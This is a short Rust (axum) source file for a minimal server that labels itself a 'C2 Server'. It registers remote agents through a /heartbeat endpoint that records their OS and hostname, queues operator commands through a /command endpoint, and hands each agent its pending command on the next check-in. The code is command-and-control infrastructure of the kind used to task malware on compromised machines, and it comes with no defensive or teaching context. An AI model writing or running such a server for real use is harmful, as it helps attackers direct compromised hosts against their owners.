use axum::{routing::post, Json, Router};
use serde::{Deserialize, Serialize};
use std::{collections::HashMap, net::SocketAddr, sync::{Arc, Mutex}};
use uuid::Uuid;

#[derive(Debug, Serialize, Deserialize, Clone)]
struct AgentData {
    id: String,
    os: String,
    hostname: String,
    last_seen: String,
    response: Option<String>,
}

#[derive(Debug, Serialize, Deserialize)]
struct CommandRequest {
    id: String,
    command: String,
}

type DB = Arc<Mutex<HashMap<String, (AgentData, Option<String>)>>>;

#[tokio::main]
async fn main() {
    let db: DB = Arc::new(Mutex::new(HashMap::new()));
    let app = Router::new()
        .route("/heartbeat", post(heartbeat_handler))
        .route("/command", post(command_handler))
        .with_state(db.clone());

    let addr = SocketAddr::from(([127, 0, 0, 1], 8080));
    println!("C2 Server running on http://{}", addr);
    axum::Server::bind(&addr)
        .serve(app.into_make_service())
        .await
        .unwrap();
}

async fn heartbeat_handler(
    axum::extract::State(db): axum::extract::State<DB>,
    Json(agent): Json<AgentData>,
) -> Json<Option<String>> {
    let mut db = db.lock().unwrap();
    let entry = db.entry(agent.id.clone()).or_insert((agent.clone(), None));
    entry.0 = agent.clone();
    Json(entry.1.take()) // Return command if exists
}

async fn command_handler(
    axum::extract::State(db): axum::extract::State<DB>,
    Json(cmd): Json<CommandRequest>,
) -> &'static str {
    let mut db = db.lock().unwrap();
    if let Some(agent) = db.get_mut(&cmd.id) {
        agent.1 = Some(cmd.command);
        "Command sent"
    } else {
        "Agent not found"
    }
}
